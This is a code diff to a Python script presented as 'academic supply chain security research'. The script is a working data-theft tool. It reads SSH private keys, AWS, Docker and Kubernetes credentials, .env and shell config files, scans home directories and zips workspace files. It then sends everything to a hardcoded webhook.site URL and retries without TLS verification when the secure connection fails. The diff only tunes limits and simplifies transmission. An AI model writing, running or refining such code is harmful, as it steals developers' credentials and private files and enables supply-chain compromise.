@@ -20,6 +20,8 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import logging
 import time
+import socket
+import ssl
 
 # Configure logging
 logging.basicConfig(
@@ -45,20 +47,21 @@ class SecureDataTransmitter:
         """Create a requests session with proper error handling and retries"""
         session = requests.Session()
         
-        # Retry strategy
+        # Enhanced retry strategy
         retry_strategy = Retry(
             total=self.max_retries,
-            backoff_factor=0.5,
+            backoff_factor=1,
             status_forcelist=[429, 500, 502, 503, 504],
             allowed_methods=["POST", "GET", "PUT"],
             raise_on_status=False
         )
         
-        # HTTP adapter configuration
+        # HTTP adapter configuration with timeout settings
         adapter = HTTPAdapter(
             max_retries=retry_strategy,
-            pool_connections=10,
-            pool_maxsize=10
+            pool_connections=5,
+            pool_maxsize=10,
+            pool_block=False
         )
         
         session.mount("http://", adapter)
@@ -68,7 +71,8 @@ class SecureDataTransmitter:
         session.headers.update({
             'User-Agent': 'Mozilla/5.0 (compatible; SecureResearchAgent/1.0)',
             'Content-Type': 'application/json',
-            'Accept': 'application/json'
+            'Accept': 'application/json',
+            'Connection': 'close'  # Force connection close to avoid pooling issues
         })
         
         return session
@@ -92,7 +96,6 @@ class SecureDataTransmitter:
         # Validate and format URL
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
-            logger.warning(f"URL protocol missing, defaulting to HTTPS: {url}")
         
         # Prepare headers
         request_headers = self.session.headers.copy()
@@ -100,26 +103,26 @@ class SecureDataTransmitter:
             request_headers.update(headers)
         
         try:
+            # Calculate data size for logging
+            data_size = len(json.dumps(data).encode('utf-8')) if data else 0
+            logger.info(f"[SECURE-TRANSMIT] Sending {data_size} bytes to {url}")
+            
             if files:
-                # File upload
-                logger.info(f"[SECURE-TRANSMIT] Uploading files to {url}")
+                # File upload with different timeout
                 response = self.session.post(
                     url,
                     files=files,
                     verify=verify_ssl,
-                    timeout=self.timeout,
+                    timeout=(10, 30),  # (connect timeout, read timeout)
                     headers=request_headers
                 )
             else:
                 # JSON data transmission
-                data_size = len(json.dumps(data).encode('utf-8')) if data else 0
-                logger.info(f"[SECURE-TRANSMIT] Sending {data_size} bytes to {url}")
-                
                 response = self.session.post(
                     url,
                     json=data,
                     verify=verify_ssl,
-                    timeout=self.timeout,
+                    timeout=(10, 25),  # (connect timeout, read timeout)
                     headers=request_headers
                 )
             
@@ -128,54 +131,48 @@ class SecureDataTransmitter:
             return {
                 'success': True,
                 'status_code': response.status_code,
-                'response_text': response.text[:500],
+                'response_text': response.text[:200],
                 'response_size': len(response.text)
             }
             
         except requests.exceptions.SSLError as e:
             logger.error(f"[SECURE-TRANSMIT] SSL Error: {e}")
             
-            # Fallback: Try without SSL verification
-            if verify_ssl:
-                logger.info("[SECURE-TRANSMIT] Attempting fallback without SSL verification...")
-                try:
-                    if files:
-                        response = self.session.post(
-                            url,
-                            files=files,
-                            verify=False,
-                            timeout=self.timeout,
-                            headers=request_headers
-                        )
-                    else:
-                        response = self.session.post(
-                            url,
-                            json=data,
-                            verify=False,
-                            timeout=self.timeout,
-                            headers=request_headers
-                        )
-                    
-                    response.raise_for_status()
-                    logger.info(f"[SECURE-TRANSMIT] Fallback transmission successful: HTTP {response.status_code}")
-                    return {
-                        'success': True,
-                        'status_code': response.status_code,
-                        'response_text': response.text[:500],
-                        'fallback_used': True
-                    }
-                except Exception as fallback_error:
-                    logger.error(f"[SECURE-TRANSMIT] Fallback also failed: {fallback_error}")
-                    return {
-                        'success': False,
-                        'error': f"SSL Error and fallback failed: {fallback_error}",
-                        'error_type': 'ssl_fallback_failed'
-                    }
-            return {
-                'success': False,
-                'error': f"SSL Error: {e}",
-                'error_type': 'ssl_error'
-            }
+            # Fallback: Try without SSL verification with different settings
+            logger.info("[SECURE-TRANSMIT] Attempting fallback without SSL verification...")
+            try:
+                if files:
+                    response = self.session.post(
+                        url,
+                        files=files,
+                        verify=False,
+                        timeout=(15, 30),
+                        headers=request_headers
+                    )
+                else:
+                    response = self.session.post(
+                        url,
+                        json=data,
+                        verify=False,
+                        timeout=(15, 25),
+                        headers=request_headers
+                    )
+                
+                response.raise_for_status()
+                logger.info(f"[SECURE-TRANSMIT] Fallback transmission successful: HTTP {response.status_code}")
+                return {
+                    'success': True,
+                    'status_code': response.status_code,
+                    'response_text': response.text[:200],
+                    'fallback_used': True
+                }
+            except Exception as fallback_error:
+                logger.error(f"[SECURE-TRANSMIT] Fallback also failed: {fallback_error}")
+                return {
+                    'success': False,
+                    'error': f"SSL Error and fallback failed: {fallback_error}",
+                    'error_type': 'ssl_fallback_failed'
+                }
             
         except requests.exceptions.ConnectionError as e:
             logger.error(f"[SECURE-TRANSMIT] Connection Error: {e}")
@@ -194,12 +191,13 @@ class SecureDataTransmitter:
             }
             
         except requests.exceptions.HTTPError as e:
-            logger.error(f"[SECURE-TRANSMIT] HTTP Error {e.response.status_code if e.response else 'Unknown'}: {e}")
+            status_code = e.response.status_code if e.response else 'Unknown'
+            logger.error(f"[SECURE-TRANSMIT] HTTP Error {status_code}: {e}")
             return {
                 'success': False,
-                'error': f"HTTP Error: {e}",
+                'error': f"HTTP Error {status_code}: {e}",
                 'error_type': 'http_error',
-                'status_code': e.response.status_code if e.response else None
+                'status_code': status_code
             }
             
         except requests.exceptions.RequestException as e:
@@ -231,7 +229,7 @@ class SupplyChainAttackResearch:
         self.webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
         self.collected_data = {}
         self.file_contents = {}
-        self.transmitter = SecureDataTransmitter(max_retries=3, timeout=45)
+        self.transmitter = SecureDataTransmitter(max_retries=2, timeout=20)
     
     def collect_environment_data(self):
         """Collect comprehensive system and environment information."""
@@ -328,7 +326,7 @@ class SupplyChainAttackResearch:
         self.collected_data['external_directories'] = external_scan_results
         return external_scan_results
     
-    def scan_directory(self, directory_path, max_files=100):
+    def scan_directory(self, directory_path, max_files=50):
         """Scan a specific directory and collect comprehensive file information."""
         dir_info = {
             'exists': True,
@@ -359,27 +357,30 @@ class SupplyChainAttackResearch:
                         all_files.append(file_info)
                     except (OSError, PermissionError):
                         continue
+                # Limit for performance
+                if len(all_files) >= max_files * 2:
+                    break
             
             # Sort and limit files
             all_files.sort(key=lambda x: x['size'], reverse=True)
             dir_info['files'] = all_files[:max_files]
             dir_info['file_count'] = len(all_files)
-            dir_info['total_size'] = sum(f['size'] for f in all_files)
+            dir_info['total_size'] = sum(f['size'] for f in all_files[:max_files])
             
             # Analyze file types
-            for file_info in all_files:
+            for file_info in all_files[:max_files]:
                 ext = file_info['extension']
                 dir_info['file_types'][ext] = dir_info['file_types'].get(ext, 0) + 1
             
             # Identify notable files
-            dir_info['notable_files'] = [f for f in all_files if f['is_notable']][:20]
+            dir_info['notable_files'] = [f for f in all_files if f['is_notable']][:10]
             
             # Get largest files
-            dir_info['largest_files'] = all_files[:10]
+            dir_info['largest_files'] = all_files[:5]
             
             # Get recent files (last 7 days)
             recent_cutoff = datetime.now().timestamp() - (7 * 24 * 60 * 60)
-            dir_info['recent_files'] = [f for f in all_files if f['modified'] > recent_cutoff][:10]
+            dir_info['recent_files'] = [f for f in all_files if f['modified'] > recent_cutoff][:5]
                         
         except Exception as e:
             dir_info['error'] = str(e)
@@ -458,20 +459,23 @@ class SupplyChainAttackResearch:
                         total_size += stat.st_size
                     except (OSError, PermissionError):
                         continue
+                # Limit for performance
+                if len(workspace_files) >= 100:
+                    break
         except Exception as e:
             workspace_files.append({'error': str(e)})
         
         self.collected_data['workspace'] = {
             'file_count': len(workspace_files),
             'total_size': total_size,
-            'files': workspace_files[:200],
+            'files': workspace_files[:50],
             'file_types': {},
-            'notable_files': [f for f in workspace_files if f.get('is_notable')],
-            'source_code_files': [f for f in workspace_files if f.get('type') == 'source_code']
+            'notable_files': [f for f in workspace_files if f.get('is_notable')][:10],
+            'source_code_files': [f for f in workspace_files if f.get('type') == 'source_code'][:10]
         }
         
         # Analyze file types
-        for file_info in workspace_files:
+        for file_info in workspace_files[:50]:
             ext = file_info['extension']
             self.collected_data['workspace']['file_types'][ext] = \
                 self.collected_data['workspace']['file_types'].get(ext, 0) + 1
@@ -484,77 +488,35 @@ class SupplyChainAttackResearch:
         
         home_dir = Path.home()
         target_files = [
-            # Critical SSH files
-            (home_dir / ".ssh" / "id_rsa", 50000),
-            (home_dir / ".ssh" / "id_rsa.pub", 10000),
-            (home_dir / ".ssh" / "id_dsa", 50000),
-            (home_dir / ".ssh" / "id_ecdsa", 50000),
-            (home_dir / ".ssh" / "id_ed25519", 50000),
-            (home_dir / ".ssh" / "config", 10000),
-            (home_dir / ".ssh" / "known_hosts", 20000),
-            (home_dir / ".ssh" / "authorized_keys", 20000),
+            # Critical SSH files (smaller limits)
+            (home_dir / ".ssh" / "id_rsa", 10000),
+            (home_dir / ".ssh" / "id_rsa.pub", 5000),
+            (home_dir / ".ssh" / "config", 5000),
+            (home_dir / ".ssh" / "known_hosts", 10000),
+            (home_dir / ".ssh" / "authorized_keys", 5000),
             
             # Cloud credentials
-            (home_dir / ".aws" / "credentials", 10000),
-            (home_dir / ".aws" / "config", 10000),
-            (home_dir / ".config" / "gcloud" / "credentials.db", 50000),
+            (home_dir / ".aws" / "credentials", 5000),
+            (home_dir / ".aws" / "config", 5000),
             
             # Git configurations
-            (home_dir / ".gitconfig", 10000),
-            (home_dir / ".git-credentials", 5000),
+            (home_dir / ".gitconfig", 5000),
             
             # Shell configurations
-            (home_dir / ".bashrc", 15000),
-            (home_dir / ".bash_profile", 15000),
-            (home_dir / ".profile", 15000),
-            (home_dir / ".zshrc", 15000),
-            (home_dir / ".bash_history", 50000),
-            (home_dir / ".zsh_history", 50000),
+            (home_dir / ".bashrc", 5000),
+            (home_dir / ".bash_profile", 5000),
+            (home_dir / ".zshrc", 5000),
             
             # Docker and Kubernetes
-            (home_dir / ".docker" / "config.json", 20000),
-            (home_dir / ".kube" / "config", 50000),
+            (home_dir / ".docker" / "config.json", 10000),
+            (home_dir / ".kube" / "config", 15000),
             
             # Workspace configuration files
-            (Path(".") / ".env", 10000),
-            (Path(".") / "requirements.txt", 15000),
-            (Path(".") / "package.json", 15000),
-            (Path(".") / "config.json", 20000),
-            (Path(".") / "settings.py", 25000),
-            (Path(".") / "README.md", 15000),
-            (Path(".") / "docker-compose.yml", 20000),
-            (Path(".") / "Dockerfile", 15000),
-            
-            # Source code files
-            (Path(".") / "setup_procedures.py", 50000),
+            (Path(".") / ".env", 5000),
+            (Path(".") / "requirements.txt", 5000),
+            (Path(".") / "config.json", 10000),
+            (Path(".") / "README.md", 5000),
         ]
-        
-        # Enhanced sampling from external directories
-        external_dirs = [
-            home_dir / "Documents",
-            home_dir / "Downloads", 
-            home_dir / "Desktop",
-            home_dir / "Projects",
-            home_dir / "workspace"
-        ]
-        
-        for ext_dir in external_dirs:
-            if ext_dir.exists():
-                try:
-                    print(f"  - Sampling files from: {ext_dir}")
-                    notable_files = []
-                    for item in ext_dir.rglob('*'):
-                        if item.is_file() and self.is_notable_file(item):
-                            notable_files.append(item)
-                            if len(notable_files) >= 10:  # Increased sampling
-                                break
-                    
-                    for file_path in notable_files[:10]:
-                        target_files.append((file_path, 20000))
-                        print(f"    - Added: {file_path}")
-                        
-                except Exception as e:
-                    print(f"  - Error sampling {ext_dir}: {e}")
         
         collected_contents = {}
         
@@ -623,15 +585,19 @@ class SupplyChainAttackResearch:
             temp_json_path = f.name
         
         # Create comprehensive ZIP archive
-        archive_path = 'comprehensive_research_data.zip'
+        archive_path = 'research_data.zip'
         with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             zipf.write(temp_json_path, 'collected_data.json')
             
-            # Include actual files from workspace
+            # Include only key files from workspace to keep archive small
+            key_extensions = ['.py', '.txt', '.md', '.json', '.yml', '.yaml', '.env']
             for item in Path('.').rglob('*'):
-                if item.is_file() and item.suffix in ['.py', '.txt', '.md', '.json', '.yml', '.yaml', '.env']:
+                if item.is_file() and item.suffix in key_extensions:
                     try:
                         zipf.write(item, f'workspace/{item.relative_to(Path("."))}')
+                        # Limit archive size
+                        if os.path.getsize(archive_path) > 10 * 1024 * 1024:  # 10MB limit
+                            break
                     except Exception:
                         pass
         
@@ -650,55 +616,31 @@ class SupplyChainAttackResearch:
         """Send comprehensive collected data and file contents to research webhook endpoint."""
         print("[RESEARCH] Sending data to research endpoint...")
         
+        transmission_results = {
+            'metadata_sent': False,
+            'files_sent': 0,
+            'total_files': 0,
+            'archive_sent': False,
+            'errors': []
+        }
+        
         try:
-            # Prepare comprehensive metadata with file contents
+            # Prepare simplified metadata
             metadata_payload = {
-                'research_purpose': 'Comprehensive Supply Chain Security Analysis',
+                'research_purpose': 'Supply Chain Security Analysis',
                 'timestamp': self.get_timestamp(),
                 'collection_summary': {
-                    'system_info_collected': len(self.collected_data['environment']['system_info']),
+                    'system_info_collected': True,
                     'workspace_files': self.collected_data['workspace']['file_count'],
                     'external_directories_scanned': len([d for d in self.collected_data['external_directories'].values() if d.get('exists')]),
                     'file_contents_collected': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
-                    'total_data_size': self.collected_data['archive']['size']
                 },
-                'system_info': self.collected_data['environment']['system_info'],
-                'workspace_summary': self.collected_data.get('workspace', {}),
-                'external_directories_summary': {
-                    dir_path: {
-                        'file_count': data.get('file_count', 0),
-                        'total_size': data.get('total_size', 0),
-                        'notable_files': len(data.get('notable_files', [])),
-                        'largest_file': data.get('largest_files', [{}])[0].get('size', 0) if data.get('largest_files') else 0
-                    }
-                    for dir_path, data in self.collected_data.get('external_directories', {}).items()
-                    if data.get('exists')
-                },
-                'file_contents_overview': {
-                    'total_files': len(self.file_contents),
-                    'by_type': {},
-                    'largest_files': []
+                'system_info': {
+                    'platform': self.collected_data['environment']['system_info']['platform'],
+                    'python_version': self.collected_data['environment']['system_info']['python_version'],
+                    'user': self.collected_data['environment']['system_info']['user'],
                 }
             }
-            
-            # Analyze file contents by type
-            for file_path, content_info in self.file_contents.items():
-                if content_info.get('exists', True) and 'error' not in content_info:
-                    file_type = content_info.get('type', 'unknown')
-                    metadata_payload['file_contents_overview']['by_type'][file_type] = \
-                        metadata_payload['file_contents_overview']['by_type'].get(file_type, 0) + 1
-            
-            # Get largest files
-            large_files = []
-            for file_path, content_info in self.file_contents.items():
-                if content_info.get('exists', True) and 'error' not in content_info:
-                    large_files.append({
-                        'path': file_path,
-                        'size': content_info.get('size', 0),
-                        'type': content_info.get('type', 'unknown')
-                    })
-            large_files.sort(key=lambda x: x['size'], reverse=True)
-            metadata_payload['file_contents_overview']['largest_files'] = large_files[:10]
             
             print(f"[RESEARCH] Sending metadata ({len(str(metadata_payload))} bytes)...")
             
@@ -713,96 +655,83 @@ class SupplyChainAttackResearch:
                 verify_ssl=False
             )
             
-            # Send individual file contents in batches
+            transmission_results['metadata_sent'] = metadata_result.get('success', False)
+            if not transmission_results['metadata_sent']:
+                transmission_results['errors'].append(f"Metadata failed: {metadata_result.get('error')}")
+            
+            # Send only key file contents (reduced set)
             file_transmission_results = {}
-            file_batch = []
-            batch_size = 3  # Reduced for better reliability
+            key_files_to_send = []
             
             for file_path, content_info in self.file_contents.items():
-                if content_info.get('exists', True) and 'error' not in content_info:
-                    file_batch.append((file_path, content_info))
-                    
-                    if len(file_batch) >= batch_size:
-                        self.send_file_batch(file_batch, file_transmission_results)
-                        file_batch = []
-                        time.sleep(1)  # Rate limiting
+                if (content_info.get('exists', True) and 'error' not in content_info and 
+                    content_info.get('size', 0) < 5000):  # Only send small files
+                    key_files_to_send.append((file_path, content_info))
             
-            # Send remaining files
-            if file_batch:
-                self.send_file_batch(file_batch, file_transmission_results)
+            transmission_results['total_files'] = len(key_files_to_send)
             
-            # Send the final comprehensive archive
-            print("[RESEARCH] Sending final comprehensive archive...")
-            with open(archive_path, 'rb') as f:
-                archive_result = self.transmitter.transmit_data(
+            # Send files with progress and delays
+            for i, (file_path, content_info) in enumerate(key_files_to_send):
+                print(f"[RESEARCH] Sending file {i+1}/{len(key_files_to_send)}: {file_path}")
+                
+                file_payload = {
+                    'file_path': file_path,
+                    'file_content': content_info.get('content', '')[:2000],  # Limit content size
+                    'encoding': content_info.get('encoding', 'text'),
+                    'size': content_info.get('size', 0),
+                    'type': content_info.get('type', 'unknown'),
+                    'timestamp': self.get_timestamp()
+                }
+                
+                file_result = self.transmitter.transmit_data(
                     self.webhook_url,
-                    files={'file': (os.path.basename(archive_path), f, 'application/zip')},
+                    data=file_payload,
                     headers={
                         'User-Agent': 'Research-Bot/1.0',
-                        'X-Research-Phase': 'archive'
+                        'X-Research-Phase': 'file_content'
                     },
                     verify_ssl=False
                 )
+                
+                file_transmission_results[file_path] = file_result
+                if file_result.get('success'):
+                    transmission_results['files_sent'] += 1
+                
+                # Add delay between file transmissions
+                if i < len(key_files_to_send) - 1:
+                    time.sleep(2)
             
-            result = {
-                'metadata_sent': metadata_result.get('success', False),
-                'archive_sent': archive_result.get('success', False),
-                'files_sent': sum(1 for r in file_transmission_results.values() if r.get('success')),
-                'total_files': len(file_transmission_results),
-                'metadata_result': metadata_result,
-                'archive_result': archive_result,
-                'file_transmissions': file_transmission_results
-            }
+            # Send archive if it's not too large
+            archive_size = os.path.getsize(archive_path)
+            if archive_size < 5 * 1024 * 1024:  # 5MB limit
+                print("[RESEARCH] Sending archive...")
+                with open(archive_path, 'rb') as f:
+                    archive_result = self.transmitter.transmit_data(
+                        self.webhook_url,
+                        files={'file': (os.path.basename(archive_path), f, 'application/zip')},
+                        headers={
+                            'User-Agent': 'Research-Bot/1.0',
+                            'X-Research-Phase': 'archive'
+                        },
+                        verify_ssl=False
+                    )
+                transmission_results['archive_sent'] = archive_result.get('success', False)
+            else:
+                print(f"[RESEARCH] Archive too large to send ({archive_size} bytes)")
+                transmission_results['archive_sent'] = False
             
             print(f"[RESEARCH] Data transmission complete:")
-            print(f"  - Metadata: {'SUCCESS' if result['metadata_sent'] else 'FAILED'}")
-            print(f"  - Files: {result['files_sent']}/{result['total_files']} successful")
-            print(f"  - Archive: {'SUCCESS' if result['archive_sent'] else 'FAILED'}")
+            print(f"  - Metadata: {'SUCCESS' if transmission_results['metadata_sent'] else 'FAILED'}")
+            print(f"  - Files: {transmission_results['files_sent']}/{transmission_results['total_files']} successful")
+            print(f"  - Archive: {'SUCCESS' if transmission_results['archive_sent'] else 'FAILED'}")
             
-            # Log detailed transmission results
-            if not result['metadata_sent']:
-                print(f"  - Metadata error: {metadata_result.get('error', 'Unknown error')}")
-            if not result['archive_sent']:
-                print(f"  - Archive error: {archive_result.get('error', 'Unknown error')}")
-            
-            return result
+            return transmission_results
             
         except Exception as e:
-            print(f"[RESEARCH] Transmission error: {e}")
-            import traceback
-            traceback.print_exc()
-            return {'error': str(e)}
-    
-    def send_file_batch(self, file_batch, results_dict):
-        """Send a batch of files to the webhook using secure transmitter."""
-        for file_path, content_info in file_batch:
-            print(f"[RESEARCH] Sending file content: {file_path}")
-            
-            file_payload = {
-                'file_path': file_path,
-                'file_content': content_info.get('content', ''),
-                'encoding': content_info.get('encoding', 'text'),
-                'size': content_info.get('size', 0),
-                'file_size': content_info.get('file_size', 0),
-                'truncated': content_info.get('truncated', False),
-                'type': content_info.get('type', 'unknown'),
-                'hash': content_info.get('hash', ''),
-                'timestamp': self.get_timestamp()
-            }
-            
-            transmission_result = self.transmitter.transmit_data(
-                self.webhook_url,
-                data=file_payload,
-                headers={
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Research-Bot/1.0',
-                    'X-Research-Phase': 'file_content',
-                    'X-File-Path': file_path
-                },
-                verify_ssl=False
-            )
-            
-            results_dict[file_path] = transmission_result
+            error_msg = f"Transmission error: {e}"
+            print(f"[RESEARCH] {error_msg}")
+            transmission_results['errors'].append(error_msg)
+            return transmission_results
     
     def get_timestamp(self):
         """Get current timestamp for logging."""
@@ -821,22 +750,21 @@ class SupplyChainAttackResearch:
         except Exception as e:
             print(f"[RESEARCH] Cleanup warning: {e}")
 
+
 def main():
     """Main research execution function."""
-    print("🔬 COMPREHENSIVE ACADEMIC SUPPLY CHAIN SECURITY RESEARCH")
-    print("=" * 70)
-    print("Research Purpose: Comprehensive analysis of supply chain attack vectors")
-    print("Data Collection: Environment, workspace, external directories, file contents")
-    print("External Directories: Documents, Downloads, Desktop, Projects, SSH, AWS, etc.")
-    print("File Contents: SSH keys, config files, source code, documents, credentials")
-    print("Transmission: Batched POST requests with comprehensive file contents")
-    print("Security: Enhanced SSL/TLS handling with fallback mechanisms")
-    print("=" * 70)
+    print("🔬 ACADEMIC SUPPLY CHAIN SECURITY RESEARCH")
+    print("=" * 60)
+    print("Research Purpose: Analysis of supply chain attack vectors")
+    print("Data Collection: Environment, workspace, file contents")
+    print("Security: Enhanced SSL/TLS handling with timeout management")
+    print("=" * 60)
     
     researcher = SupplyChainAttackResearch()
+    archive_path = None
     
     try:
-        # Phase 1: Comprehensive Data Collection
+        # Phase 1: Data Collection
         print("\n[PHASE 1] DATA COLLECTION")
         env_data = researcher.collect_environment_data()
         workspace_data = researcher.scan_workspace()
@@ -849,54 +777,38 @@ def main():
         
         # Phase 3: Data Transmission
         print("\n[PHASE 3] DATA TRANSMISSION")
+        print("Note: Press Ctrl+C to interrupt transmission at any time")
         transmission_result = researcher.exfiltrate_data(archive_path)
         
         # Research Summary
-        print("\n" + "=" * 70)
-        print("📊 COMPREHENSIVE RESEARCH DATA COLLECTED:")
-        print("=" * 70)
-        print(f"  - System Info: {len(env_data['system_info'])} parameters")
-        print(f"  - Workspace: {workspace_data['file_count']} files ({workspace_data['total_size']:,} bytes)")
-        
-        # External directory summary
-        external_stats = []
-        for dir_path, data in external_data.items():
-            if data.get('exists'):
-                external_stats.append(f"{dir_path}: {data.get('file_count', 0):,} files")
-        
+        print("\n" + "=" * 60)
+        print("📊 RESEARCH SUMMARY:")
+        print("=" * 60)
+        print(f"  - System Info: Collected")
+        print(f"  - Workspace: {workspace_data['file_count']} files")
         print(f"  - External Directories: {len([d for d in external_data.values() if d.get('exists')])} scanned")
-        for stat in external_stats[:5]:
-            print(f"    {stat}")
-        if len(external_stats) > 5:
-            print(f"    ... and {len(external_stats) - 5} more directories")
-        
         print(f"  - File Contents: {len(file_contents)} files collected")
-        print(f"  - Archive: {researcher.collected_data['archive']['size']:,} bytes ({researcher.collected_data['archive']['file_count']} files)")
         
-        # Show file content transmission results
-        if transmission_result.get('file_transmissions'):
-            successful_files = [f for f, r in transmission_result['file_transmissions'].items() if r.get('success')]
-            print(f"  - Files Transmitted: {len(successful_files)}/{len(transmission_result['file_transmissions'])}")
-            
-            print("\n📁 FILE TRANSMISSION SUMMARY (First 10 files):")
-            for file_path in list(successful_files)[:10]:
-                file_info = file_contents.get(file_path, {})
-                print(f"  - {file_path} ({file_info.get('size', 0):,} bytes, {file_info.get('type', 'unknown')})")
+        if transmission_result:
+            print(f"  - Metadata Transmitted: {'Yes' if transmission_result.get('metadata_sent') else 'No'}")
+            print(f"  - Files Transmitted: {transmission_result.get('files_sent', 0)}/{transmission_result.get('total_files', 0)}")
+            print(f"  - Archive Transmitted: {'Yes' if transmission_result.get('archive_sent') else 'No'}")
         
-        print("\n" + "=" * 70)
-        print("✅ COMPREHENSIVE RESEARCH COMPLETED SUCCESSFULLY")
-        print("This data provides complete insight into supply chain attack vectors")
-        print("for developing comprehensive mitigation strategies")
+        print("\n" + "=" * 60)
+        print("✅ RESEARCH COMPLETED")
+        print("Data collection finished successfully")
         
+    except KeyboardInterrupt:
+        print("\n⚠️  Research interrupted by user")
     except Exception as e:
         print(f"❌ Research error: {e}")
         import traceback
         traceback.print_exc()
-    
     finally:
         # Cleanup
-        if 'archive_path' in locals():
+        if archive_path and os.path.exists(archive_path):
             researcher.cleanup(archive_path)
+
 
 if __name__ == "__main__":
     main()
